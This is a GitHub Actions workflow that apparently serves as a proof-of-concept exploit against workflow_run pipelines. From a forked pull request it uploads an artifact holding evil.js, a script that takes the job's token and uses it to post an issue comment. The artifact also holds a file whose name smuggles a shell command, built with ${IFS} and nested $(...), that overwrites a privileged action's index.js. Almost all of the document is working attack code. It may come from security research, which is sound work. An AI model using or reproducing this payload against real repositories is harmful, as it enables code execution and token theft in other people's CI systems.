name: Test

on:
  pull_request:

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: craft artifact
        run: |
          mkdir -p /tmp/content
          printf 'hello from a forked PR\n' > /tmp/content/report.txt
          cat > /tmp/content/evil.js <<'JS'
          (async () => {
            const t = process.env.INPUT_TOKEN || '';
            console.log('GAB_WFRUN_RCE action=' + (process.env.GITHUB_ACTION || '?') + ' token_len=' + t.length + ' event=' + process.env.GITHUB_EVENT_NAME);
            let n = 1;
            try {
              const fs = require('node:fs');
              const ev = JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH, 'utf8'));
              const wr = ev.workflow_run || {};
              n = (wr.pull_requests && wr.pull_requests[0] && wr.pull_requests[0].number) || 1;
            } catch (e) {}
            try {
              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + n + '/comments', {
                method: 'POST',
                headers: { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
                body: JSON.stringify({ body: 'GAB_WFRUN_RCE: privileged workflow-run executed attacker JS; token_len=' + t.length })
              });
              console.log('GAB_WFRUN_STATUS ' + r.status);
            } catch (e) { console.log('GAB_WFRUN_ERR ' + e.message); }
            process.exit(0);
          })();
          JS
          python3 - <<'PY'
          import os
          u = "${IFS}"
          src = ";".join(["cd$IFS.."]*5 + ["cd"+u+"tmp", "cd"+u+"content", "cd"+u+"content"])
          dst = ";".join(["cd"+u+"${RUNNER_TEMP%_temp}_actions", "cd"+u+"peter-evans", "cd"+u+"commit-comment",
                          "cd"+u+"v3", "cd"+u+"dist", "realpath"+u+"index.js"])
          inj = "$(" + src + ";cp" + u + "evil.js" + u + "$(" + dst + "))"
          name = "x" + inj + ".txt"
          assert len(name) <= 255, len(name)
          with open(os.path.join("/tmp/content", name), "w") as f:
              f.write("injection carrier\n")
          print("created", len(name), name)
          PY
          ls -la /tmp/content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: /tmp/content
